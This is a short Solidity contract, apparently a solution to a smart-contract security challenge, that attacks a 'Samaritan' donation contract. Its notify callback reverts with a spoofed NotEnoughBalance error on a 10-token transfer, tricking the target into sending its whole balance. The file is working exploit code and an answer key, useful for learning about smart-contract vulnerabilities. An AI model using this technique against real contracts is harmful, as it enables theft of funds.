// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface ISamaritan {
    function requestDonation() external returns(bool enoughBalance);  
}

interface INotifyable {
    function notify(uint256 amount) external;
}

contract SamaritanAttacker is INotifyable {
    ISamaritan public challenge;

    error NotEnoughBalance();

    constructor(address challengeAddress) {
        challenge = ISamaritan(challengeAddress);
    }

    function attack() public payable { 
        challenge.requestDonation();       
    }

    function notify(uint256 amount) external pure override {
        //first, the Samaritan will send 10 tokens => on this amount we'll revert
        //then, the Samaritan will send the entire balance => so, for all amounts != 10 we must not revert
        if(amount == 10){
            revert NotEnoughBalance();
        }
    }   
}